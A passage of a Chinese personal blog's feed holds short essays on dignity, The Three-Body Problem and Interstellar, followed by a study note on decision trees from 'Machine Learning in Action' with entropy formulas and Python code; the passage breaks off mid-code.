有几个人有过属于个人的尊严。举个大点的例子，中国历史上有过皇上对大臣施廷仗的事，无论多大的官，一言不合，就有可能受到如此当众羞辱，……”<br>“举个小点的例子，没到春运高潮，大家就会在传媒上看到一辆硬座车厢里挤了三四百人，厕所里也挤了十几人。谈到这件事，大家会说国家的铁路需要建设，说道铁路工人的工作难做，提到安全问题，提到所有方面，就是不提这些民工这样挤在一起，完全没有了个人尊严——仿佛这件事很不重要似的。……”</p>]]></content>
      
      <categories>
          
          <category> Essay </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Essay </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>三体-星际穿越</title>
      <link href="/2018/02/02/%E4%B8%89%E4%BD%93-%E7%BB%B4%E5%BE%B7%E6%98%9F%E9%99%85%E7%A9%BF%E8%B6%8A-%E7%94%B7%E4%B8%BB/"/>
      <url>/2018/02/02/%E4%B8%89%E4%BD%93-%E7%BB%B4%E5%BE%B7%E6%98%9F%E9%99%85%E7%A9%BF%E8%B6%8A-%E7%94%B7%E4%B8%BB/</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>我是在敦煌的戈壁滩上，看完整个《三体》，</p><p>1月份敦煌的戈壁滩，气候极其干燥，没有一丝下雪的痕迹，室外阳光高照，但总是狂风大作，仿佛要狠狠的从戈壁滩上刮走什么，在这种时候仍需要每日进入戈壁腹地进行测试工作，</p><p>清晨赶着晨曦上车，左右颠簸中来到地图上也没标记的地点，从车上下车前，每人都会领到帽子护膝围脖等用品，那几日，往往赶上狂风大作，下车后每一步都不像是走路，而是与大风作对，风沙从你的衣领裤腿缝隙钻入，的工作听着风从车的缝隙中钻入，人在外面没有防护措施的呆不过十分钟，就会被大风带走身上大部分的热量，人在车外工作十分钟就会迫不及待的跳上车子，在这里，前前后后十几公里都不会有人存在，整个车子都沉浸在风沙中，你只会觉得仿佛在外星球，而你坐的车就是你的飞船，你只会觉得整个戈壁滩上，只有这个车子才是你唯一的依靠，出了车子，你绝对活不过数十分钟的。<br>就是在这种环境下，我看完了整个三体，<br>将车想做是飞船，将外面的戈壁滩想做的荒凉的沙漠，<br>而我们的保证仅仅是几厘米厚的钢板，</p><p>其中的故事情节，有太多的解读，这里写下我的感受最深的。<br>维德-为了目的不择手段，是为了人类的延续，真正的男人。不达目的誓不罢休，可惜他与书中的当权者，或者是外星人的选择无关，如果设想最后的执剑人是维德，恐怕最后的结局也会改写吧。<br>反观女主，优柔寡断，在关键时刻，没能把握机会，从一开始，三体人就布下所有的计划，等罗辑交出执剑人身份的时候，就发动进攻。</p><p>星际穿越，也是我看的感触比较深的电影，<br>一、是在男主骗女主要去新的星球，最后将机会给了女主，那句“物理学第二定律，总要留下些什么”<br>二、结尾，男主在恢复后，义无反顾的“偷来”宇航船，去奔向女主，不论是什么原因，爱情还是同甘共苦的情谊，感受到了人类的顽强生生不息，这种感觉不是简单的迸发，而是整个电影的铺垫，</p><p>《星际穿越》诺兰大神，拍出了不一样的意味，整个电影不像一部电影，而像一部纪录片，其中无数的人性冲突，理性的煎熬，诺兰德早就知道计算结果的局限，直到生命的最后一刻，才说出那句对不起，男主的女儿，苦苦思索，到电影最后，终于思索出，书架上的暗示，整个电影不喜不悲，或者说已经很艺术的处理物理环境的恶劣，人类无论是哲学上的处于“不自知”的状态，还是在整个宇宙环境下，都是脆弱的，人类距离外太空，只有几公里的大气层和地球的磁场的保护，没有的磁场保护，人类只能存活半小时，没有大气层，人类连十分钟都活不到，</p><p>在这部电影中，我看出了不一样的情节。“无论乐观悲观，只想完成任务。”电影简化了人性的选择，除了马特戴蒙的角色，无一不是按照使命完成任务，他们在物理条件面前，想到过自己么，理性会高于人性，这19/12位宇航员，都是这样的么。</p><p>最后的男主被未来人类拯救来到高维空间，这里有一个疑问，此时被拯救的男主改变了时间线，必将产生新的未来人类，旧的未来人类消失，根据“祖父悖论”，那也就不会去高维空间，那也就不会解决公式，那新的未来人类也不会产生，但时间线继续发展，还会产生旧的未来人类，旧的未来人类继续拯救男主，产生新的未来人类，旧的未来人类消失……以此类推，人类历史会不会形成闭环？<br>或者新的未来人类仍然拯救男主，来到高维空间……此时旧的未来人类和新的未来人类在时间线中做出了同样一件事情。那根据电影中的设定，他们必然通过重力进行沟通，（设定每次的选择都会产生新的时间线，新的宇宙，这也是平行宇宙的理解）</p>]]></content>
      
      
        <tags>
            
            <tag> 随想 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>03机器学习实战-第3章 决策树</title>
      <link href="/2018/01/28/03%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%AE%9E%E6%88%98-%E7%AC%AC3%E7%AB%A0%20%E5%86%B3%E7%AD%96%E6%A0%91/"/>
      <url>/2018/01/28/03%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%AE%9E%E6%88%98-%E7%AC%AC3%E7%AB%A0%20%E5%86%B3%E7%AD%96%E6%A0%91/</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>[TOC]</p><h1 id="第3章-决策树"><a href="#第3章-决策树" class="headerlink" title="第3章 决策树"></a>第3章 决策树</h1><h2 id="本章内容"><a href="#本章内容" class="headerlink" title="本章内容"></a>本章内容</h2><blockquote><ul><li>决策树简介  </li><li>在数据集中度量一致性  </li><li>使用递归构造决策树     </li><li>使用Matplotlib绘制树形图   </li></ul></blockquote><h2 id="决策树的构造"><a href="#决策树的构造" class="headerlink" title="决策树的构造"></a>决策树的构造</h2><blockquote><p>优点：计算复杂度不高，输出易于理解，对中间值得确实不敏感，可以处理不相关特征数据。<br>缺点：可能会产生过度匹配问题<br>使用数据类型：数值型和标称型  </p></blockquote><p><strong>创建分支伪代码函数createBranch()如下：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">检测数据集中的每个指向是否属于同一个分类：</span><br><span class="line">    IF so return 类标签</span><br><span class="line">    Else</span><br><span class="line">        寻找划分数据集的最好特征</span><br><span class="line">        划分数据集</span><br><span class="line">        创建分支节点</span><br><span class="line">            for 每个划分的子集</span><br><span class="line">                调用函数createBranch并增加返回结果到分支节点中</span><br><span class="line">        return 分支节点</span><br></pre></td></tr></table></figure></p><p>上述是一个递归函数</p><h2 id="决策树的一般流程"><a href="#决策树的一般流程" class="headerlink" title="决策树的一般流程"></a>决策树的一般流程</h2><blockquote><p>(1) 收集数据：可以使用任何方法。<br>(2) 准备数据：树构造算法只适用于标称型数据，因此数值型数据必须离散化。<br>(3) 分析数据：可以使用任何方法，构造树完成之后，我们应该检查图形是否符合预期。<br>(4) 训练算法：构造树的数据结构。<br>(5) 测试算法：使用经验树计算错误率。<br>(6) 使用算法：词步骤可以使用于任何监督学习算法，而使用决策树可能更好地理解数据的内在含义。  </p></blockquote><p><strong> 摘要</strong></p><ol><li>信息论相关知识</li><li>决策树算法原理</li><li>代码实现与解释   </li></ol><p>今天总结决策树算法，目前建立决策树有三种主要算法：ID3、C4.5以及CART。由于算法知识点比较琐碎，我分成两节来总结。</p><p>第一节主要是梳理决策树算法中ID3和C4.5的知识点；第二节主要梳理剪枝技术、CART算法和随机森林算法的知识。</p><h2 id="信息论"><a href="#信息论" class="headerlink" title="信息论"></a>信息论</h2><h3 id="1-信息熵"><a href="#1-信息熵" class="headerlink" title="1.信息熵"></a>1.信息熵</h3><p>在决策树算法中，熵是一个非常非常重要的概念。</p><p>一件事发生的概率越小，我们说它所蕴含的信息量越大。</p><p>比如：我们听女人能怀孕不奇怪，如果某天听到哪个男人怀孕了，我们就会觉得emmm…信息量很大了。</p><p>所以我们这样衡量信息量：</p><script type="math/tex; mode=display">i(y)=-log{P(y)}</script><p>其中，$P(y)$是事件发生的概率。</p><p>信息熵就是所有可能发生事件的信息量的期望：  </p><script type="math/tex; mode=display">H(Y)=-\sum_{i=1}^{n}P(y_i)log{P(y_i)}</script><p>表达了$Y$事件发生的不确定度。  </p><h3 id="2-条件熵"><a href="#2-条件熵" class="headerlink" title="2.条件熵"></a>2.条件熵</h3><p>条件熵：表示在X给定条件下，$Y$的条件概率分布的熵对$X$的数学期望。其数学推导如下：</p><script type="math/tex; mode=display">\begin{aligned} % requires amsmath; align* for no eq. numberH(Y|X) & =\sum_{x\in{X}}P{(x)}H(Y|X=x) \\   & =-\sum_{x\in{X}}P(x)\sum_{y\in{Y}}P(y|x)log{P(y|x)}\\   & =-\sum_{x\in{X}}\sum_{y\in{Y}}P(x,y)log{P(y|x)}\end{aligned}</script><p>条件熵$H（Y|X）$表示在已知随机变量$X$的条件下随机变量Y的不确定性。注意一下，条件熵中X也是一个变量，意思是在一个变量$X$的条件下（变量$X$的每个值都会取到），另一个变量$Y$的熵对$X$的期望。</p><p>举个例子</p><p>例：女生决定主不主动追一个男生的标准有两个：颜值和身高，如下表所示：</p><div class="table-container"><table><thead><tr><th></th><th>颜值</th><th>身高</th><th>追不追</th></tr></thead><tbody><tr><td>1</td><td>帅</td><td>高</td><td>追</td></tr><tr><td>2</td><td>帅</td><td>不高</td><td>追</td></tr><tr><td>3</td><td>不帅</td><td>高</td><td>不追</td></tr></tbody></table></div><p>上表中随机变量$Y=\{追，不追\}$，$P(Y=追)=2/3$，$P(Y=不追)=1/3$，得到$Y$的熵：</p><script type="math/tex; mode=display">\begin{aligned} % requires amsmath; align* for no eq. numberH(Y) & =-\frac{2}{3}log\frac{2}{3}-\frac{1}{3}log\frac{1}{3} \\   & =0.918\end{aligned}</script><p>这里还有一个特征变量$X$，$X=｛高，不高｝$。当$X=高$时，追的个数为1，占1/2，不追的个数为1，占1/2，此时：</p><script type="math/tex; mode=display">H(Y|X=高)=-\frac{1}{2}log\frac{1}{2}-\frac{1}{2}log\frac{1}{2}</script><p>同理：</p><script type="math/tex; mode=display">H(Y|X=不高)=-{1}log{1}-{1}log{1}</script><p>（注意：我们一般约定，当$p=0$时，$plogp=0$）</p><p>所以我们得到条件熵的计算公式：  </p><script type="math/tex; mode=display">\begin{aligned} % requires amsmath; align* for no eq. numberH(Y|X=身高) & =P(X=不高)*H(Y|X=不高)+P(X=高)*H(Y|X=高)\\            & =0.67\end{aligned}</script><h3 id="3-信息增益"><a href="#3-信息增益" class="headerlink" title="3.信息增益"></a>3.信息增益</h3><p>当我们用另一个变量$X$对原变量$Y$分类后，原变量$Y$的不确定性就会减小了（即熵值减小）。而熵就是不确定性，不确定程度减少了多少其实就是信息增益。这就是信息增益的由来，所以信息增益定义如下：</p><script type="math/tex; mode=display">Gain(Y,X)=H(Y)-H(Y|X)</script><p>此外，信息论中还有互信息、交叉熵等概念，它们与本算法关系不大，这里不展开。 </p><h2 id="代码实现与解读"><a href="#代码实现与解读" class="headerlink" title="代码实现与解读"></a>代码实现与解读</h2><p><strong>1.计算给定数据的香浓熵 </strong>    </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#计算给定数据集的香农熵</span></span><br><span class="line"><span class="comment">#从math中导入log函数</span></span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> log</span><br><span class="line"><span class="keyword">import</span> operator</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calcShannonEnt</span><span class="params">(dataSet)</span>:</span></span><br><span class="line">    numEntries = len(dataSet)   <span class="comment">#计算实例中的个数</span></span><br><span class="line">    </span><br><span class="line">    labelCounts = &#123;&#125;    <span class="comment">#创建字典，键为标签，值为个数</span></span><br><span class="line">   </span><br><span class="line">    <span class="keyword">for</span> featVec <span class="keyword">in</span> dataSet:    <span class="comment">#the the number of unique elements and their occurance</span></span><br><span class="line">        </span><br><span class="line">        currentLabel = featVec[<span class="number">-1</span>]    <span class="comment">#得到标签，注意是最后一个标签</span></span><br><span class="line">       </span><br><span class="line">        <span class="keyword">if</span> currentLabel <span class="keyword">not</span> <span class="keyword">in</span> labelCounts.keys():     <span class="comment">#如果标签不在字典已经存在的键中</span></span><br><span class="line">            </span><br><span class="line">            labelCounts[currentLabel] = <span class="number">0</span>       <span class="comment">#创建名为currentLabel的键，赋值为0</span></span><br><span class="line">          </span><br><span class="line">        labelCounts[currentLabel] += <span class="number">1</span>     <span class="comment">#标签为currentLabel的个数加1       </span></span><br><span class="line">    shannonEnt = <span class="number">0.0</span></span><br><span class="line">    <span class="keyword">for</span> key <span class="keyword">in</span> labelCounts:</span><br><span class="line">        prob = float(labelCounts[key])/numEntries    <span class="comment">#计算每一个标签的概率p</span></span><br><span class="line">        </span><br><span class="line">        shannonEnt -= prob * log(prob,<span class="number">2</span>)    <span class="comment">#log base 2利用公式计算香农熵</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> shannonEnt</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">createDataSet</span><span class="params">()</span>:</span></span><br><span class="line">    dataSet = [[<span class="number">1</span>, <span class="number">1</span>, <span class="string">'yes'</span>],</span><br><span class="line">              [<span class="number">1</span>, <span class="number">1</span>, <span class="string">'yes'</span>],</span><br><span class="line">              [<span class="number">1</span>, <span class="number">0</span>, <span class="string">'no'</span>],</span><br><span class="line">              [<span class="number">0</span>, <span class="number">1</span>, <span class="string">'no'</span>],</span><br><span class="line">              [<span class="number">0</span>, <span class="number">1</span>, <span class="string">'no'</span>]]</span><br><span class="line">    labels = [<span class="string">'no surfacing'</span>,<span class="string">'flippers'</span>]</span><br><span class="line">    <span class="comment">#change to discrete values</span></span><br><span class="line">    <span class="keyword">return</span> dataSet, labels</span><br><span class="line">myDat,labels=createDataSet()</span><br><span class="line">myDat,labels</span><br></pre></td></tr></table></figure><pre><code>([[1, 1, &#39;yes&#39;], [1, 1, &#39;yes&#39;], [1, 0, &#39;no&#39;], [0, 1, &#39;no&#39;], [0, 1, &#39;no&#39;]], [&#39;no surfacing&#39;, &#39;flippers&#39;])</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">calcShannonEnt(myDat)</span><br></pre></td></tr></table></figure><pre><code>0.9709505944546686</code></pre><p><strong>2.创建选取的数据特征属性划分数据集</strong></p><p>程序清单：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#按照给定特征划分数据集</span></span><br><span class="line"><span class="comment">#参数解释：dataSet待划分数据集</span></span><br><span class="line"><span class="comment">#axis：划分数据集的特征，这个函数里指函数第几列</span></span><br><span class="line"><span class="comment">#value：特征返回值，指的是特征划分的标准</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">splitDataSet</span><span class="params">(dataSet, axis, value)</span>:</span></span><br><span class="line">    retDataSet = []     <span class="comment">#创建一个新列表</span></span><br><span class="line">  </span><br><span class="line">    <span class="keyword">for</span> featVec <span class="keyword">in</span> dataSet:</span><br><span class="line">        <span class="keyword">if</span> featVec[axis] == value:   <span class="comment">#如果这组数据特征值等于特征返回值的话</span></span><br><span class="line">            </span><br><span class="line">            reducedFeatVec = featVec[:axis]       <span class="comment">#这两行是把原来的数据除掉划分数据的特征那一列 </span></span><br><span class="line">            </span><br><span class="line">            reducedFeatVec.extend(featVec[axis+<span class="number">1</span>:])</span><br><span class="line">            retDataSet.append(reducedFeatVec)   <span class="comment">#把列表reduceFeatVect放入retDataSet中</span></span><br><span class="line">            </span><br><span class="line">    <span class="keyword">return</span> retDataSet</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">splitDataSet(myDat,<span class="number">0</span>,<span class="number">1</span>) </span><br><span class="line"><span class="comment"># myDat=[1, 1, 'yes'],</span></span><br><span class="line"><span class="comment">#       [1, 1, 'yes'],</span></span><br><span class="line"><span class="comment">#       [1, 0, 'no'],</span></span><br><span class="line"><span class="comment">#       [0, 1, 'no'],</span></span><br><span class="line"><span class="comment">#       [0, 1, 'no']</span></span><br><span class="line"><span class="comment"># 将myDat的第1列按照取出所有等于1的方式划分</span></span><br></pre></td></tr></table></figure><pre><code>[[1, &#39;yes&#39;], [1, &#39;yes&#39;], [0, &#39;no&#39;]]</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">splitDataSet(myDat,<span class="number">0</span>,<span class="number">0</span>)</span><br></pre></td></tr></table></figure><pre><code>[[1, &#39;no&#39;], [1, &#39;no&#39;]]</code></pre><p><strong>3.根据信息增益准则，选取最好的划分特征</strong></p><p>程序清单：  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#找到最好的数据集划分方式</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">chooseBestFeatureToSplit</span><span class="params">(dataSet)</span>:</span></span><br><span class="line">    numFeatures = len(dataSet[<span class="number">0</span>]) - <span class="number">1</span>    <span class="comment">#得到特征个数，减1是因为类别栏     #the last column is used for the labels</span></span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">    baseEntropy = calcShannonEnt(dataSet)   <span class="comment">#计算数据原始香农熵</span></span><br><span class="line">   </span><br><span class="line">    bestInfoGain = <span class="number">0.0</span>; bestFeature = <span class="number">-1</span>   <span class="comment">#初始化信息增益和初始化最优特征</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(numFeatures):       </span><br><span class="line">        </span><br><span class="line">        featList = [example[i] <span class="keyword">for</span> example <span class="keyword">in</span> dataSet]  <span class="comment">#熟悉这种写法，括号里面是取了第i个特征的所有值</span></span><br><span class="line">        </span><br><span class="line">        uniqueVals = set(featList)    <span class="comment">#set()，生成一个集合数据类型，其和列表类型一样，不同之处在于</span></span><br><span class="line">                                      <span class="comment">#集合数据类型里面的值不重复，是唯一的</span></span><br><span class="line">        </span><br><span class="line">        newEntropy = <span class="number">0.0</span>    <span class="comment">#初始化新熵为0</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> value <span class="keyword">in</span> uniqueVals:    <span class="comment">#下面这个for函数主要为了计算按第i个特征划分的新熵</span></span><br><span class="line">           </span><br><span class="line">            subDataSet = splitDataSet(dataSet, i, value)    <span class="comment">#生成按value值划分的数据集</span></span><br><span class="line">            </span><br><span class="line">            prob = len(subDataSet)/float(len(dataSet))   <span class="comment">#计算概率</span></span><br><span class="line">            </span><br><span class="line">            newEntropy += prob * calcShannonEnt(subDataSet)    <span class="comment">#计算新熵 </span></span><br><span class="line">       </span><br><span class="line">        infoGain = baseEntropy - newEntropy     <span class="comment">#计算信息增益calculate the info gain; ie reduction in entropy</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (infoGain &gt; bestInfoGain):      <span class="comment">#得到最大的信息增益和选取特征 #compare this to the best gain so far</span></span><br><span class="line">            bestInfoGain = infoGain         <span class="comment">#if better than current best, set to best</span></span><br><span class="line">            bestFeature = i</span><br><span class="line">    <span class="keyword">return</span> bestFeature                      <span class="comment">#returns an integer</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># myDat=[1, 1, 'yes'],</span></span><br><span class="line"><span class="comment">#       [1, 1, 'yes'],</span></span><br><span class="line"><span class="comment">#       [1, 0, 'no'],</span></span><br><span class="line"><span class="comment">#       [0, 1, 'no'],</span></span><br><span class="line"><span class="comment">#       [0, 1, 'no']</span></span><br><span class="line">numFeatures = len(myDat[<span class="number">0</span>]) - <span class="number">1</span> <span class="comment">#得到特征个数，减1是因为类别栏     #the last column is used for the labels</span></span><br><span class="line">    <span class="comment">#计算数据原始香农熵</span></span><br><span class="line"><span class="comment"># numFeatures</span></span><br><span class="line">baseEntropy = calcShannonEnt(myDat)</span><br><span class="line">print(<span class="string">"numFeatures=%d"</span> %numFeatures) </span><br><span class="line">print(<span class="string">"原始熵是："</span>,baseEntropy)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">#初始化信息增益和初始化最优特征</span></span><br><span class="line">bestInfoGain = <span class="number">0.0</span>; bestFeature = <span class="number">-1</span>     </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(numFeatures):        <span class="comment">#iterate over all the features</span></span><br><span class="line">        <span class="comment">#熟悉这种写法，括号里面是取了第i个特征的所有值</span></span><br><span class="line">    featList = [example[i] <span class="keyword">for</span> example <span class="keyword">in</span> myDat]</span><br><span class="line">    print(<span class="string">"第%d个特征的所有取值"</span> %i,featList)</span><br><span class="line">    </span><br><span class="line">    uniqueVals = set(featList) </span><br><span class="line">    <span class="comment">#初始化新熵为0#get a set of unique values</span></span><br><span class="line">    newEntropy = <span class="number">0.0</span></span><br><span class="line">        <span class="comment">#下面这个for函数主要为了计算按第i个特征划分的新熵</span></span><br><span class="line">    print(<span class="string">"-简化取值:"</span>,uniqueVals)</span><br><span class="line">    <span class="keyword">for</span> value <span class="keyword">in</span> uniqueVals:</span><br><span class="line">            <span class="comment">#生成按value值划分的数据集</span></span><br><span class="line">        subDataSet = splitDataSet(myDat, i, value)</span><br><span class="line">        print(<span class="string">"--按照%d划分取值"</span>% value,subDataSet)</span><br><span class="line">            <span class="comment">#计算概率</span></span><br><span class="line">        prob = len(subDataSet)/float(len(myDat))</span><br><span class="line">            <span class="comment">#计算新熵</span></span><br><span class="line">        print(<span class="string">"---去此值的概率是："</span>,prob)</span><br><span class="line">        newEntropy += prob * calcShannonEnt(subDataSet)   </span><br><span class="line">            <span class="comment">#计算信息增益</span></span><br><span class="line">        print(<span class="string">"---新熵是"</span>,newEntropy)</span><br><span class="line">    infoGain = baseEntropy - newEntropy     <span class="comment">#calculate the info gain; ie reduction in entropy</span></span><br><span class="line">    print(<span class="string">"-----信息增益"</span>,infoGain)</span><br><span class="line">        <span class="comment">#得到最大的信息增益和选取特征</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (infoGain &gt; bestInfoGain):       <span class="comment">#compare this to the best gain so far</span></span><br><span class="line">        bestInfoGain = infoGain         <span class="comment">#if better than current best, set to best</span></span><br><span class="line">        bestFeature = i</span><br><span class="line">    </span><br><span class="line">    print(<span class="string">"此时最好的熵是"</span>,bestInfoGain,<span class="string">"此时最佳特征值是"</span>,bestFeature)</span><br></pre></td></tr></table></figure><pre><code>numFeatures=2原始熵是： 0.9709505944546686第0个特征的所有取值 [1, 1, 1, 0, 0]-简化取值: {0, 1}--按照0划分取值 [[1, &#39;no&#39;], [1, &#39;no&#39;]]---去此值的概率是： 0.4---新熵是 0.0--按照1划分取值 [[1, &#39;yes&#39;], [1, &#39;yes&#39;], [0, &#39;no&#39;]]---去此值的概率是： 0.6---新熵是 0.5509775004326937-----信息增益 0.4199730940219749此时最好的熵是 0.4199730940219749 此时最佳特征值是 0第1个特征的所有取值 [1, 1, 0, 1, 1]-简化取值: {0, 1}--按照0划分取值 [[1, &#39;no&#39;]]---去此值的概率是： 0.2---新熵是 0.0--按照1划分取值 [[1, &#39;yes&#39;], [1, &#39;yes&#39;], [0, &#39;no&#39;], [0, &#39;no&#39;]]---去此值的概率是： 0.8---新熵是 0.8-----信息增益 0.17095059445466854此时最好的熵是 0.4199730940219749 此时最佳特征值是 0</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chooseBestFeatureToSplit(myDat)</span><br></pre></td></tr></table></figure><pre><code>0</code></pre><p><strong>从数据集构造决策树算法：其工作原理如下：</strong></p><ol><li>得到原始数据集  </li><li>基于最好的属性值划分数据集（可能存在大于两个分支的数据集划分）    </li><li>第一次划分后，数据被向下传递到树分支的下一个节点（可以用递归的思想）</li></ol><p><strong>递归的条件： </strong><br>程序遍历完所有划分数据集属性，或者每个分支下的所有实例都具有相同的分支。</p><p><strong>4.多数表决器</strong></p><p>程序清单：  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#多数表决器</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">majorityCnt</span><span class="params">(classList)</span>:</span></span><br><span class="line">    </span><br><span class="line">    classCount=&#123;&#125;</span><br><span class="line">    <span class="comment">#for程序用来计数</span></span><br><span class="line">    <span class="keyword">for</span> vote <span class="keyword">in</span> classList:</span><br><span class="line">        <span class="keyword">if</span> vote <span class="keyword">not</span> <span class="keyword">in</span> classCount.keys(): </span><br><span class="line">            classCount[vote] = <span class="number">0</span></span><br><span class="line">        classCount[vote] += <span class="number">1</span></span><br><span class="line">    <span class="comment">#排序函数</span></span><br><span class="line">    sortedClassCount = sorted(classCount.iteritems(), key=operator.itemgetter(<span class="number">1</span>), reverse=<span class="keyword">True</span>)</span><br><span class="line">    <span class="keyword">return</span> sortedClassCount[<span class="number">0</span>][<span class="number">0</span>]</span><br></pre></td></tr></table></figure><p><strong>5.创建决策树</strong>  </p><p>程序清单：  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#创建树</span></span><br><span class="line"><span class="comment">#     myDat  = [[1, 1, 'yes'],</span></span><br><span class="line"><span class="comment">#               [1, 1, 'yes'],</span></span><br><span class="line"><span class="comment">#               [1, 0, 'no'],</span></span><br><span 